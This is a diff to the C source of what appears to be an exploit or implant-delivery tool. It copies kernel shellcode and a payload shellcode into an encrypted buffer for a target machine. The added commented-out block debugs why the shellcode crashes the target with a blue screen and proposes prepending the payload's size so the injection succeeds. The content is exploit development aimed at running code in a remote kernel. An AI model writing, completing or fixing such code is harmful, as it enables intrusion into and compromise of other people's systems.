@@ -283,6 +283,18 @@ int main(int argc, char* argv[])
 	//copy kernel shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted, kernel_shellcode, kernel_shellcode_size);
 
+	//TO FIX:
+	//Shellcode is BSODing the target because the length of the payload shellcode is not added
+	//therefore it must be added...because of this it should contain code that adds the value
+	//Let's try this:
+	/*
+	DWORD DWsizeOfShellcode = sizeof(shellcode) / sizeof(shellcode[0]);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&DWsizeOfShellcode, 4);
+
+	//copy payload shellcode to encrypted buffer at the APPROPRIATE location ( +4 after kernel shellcode size )
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
+	*/
+	
 	//copy payload shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size, shellcode, payload_shellcode_size);
 
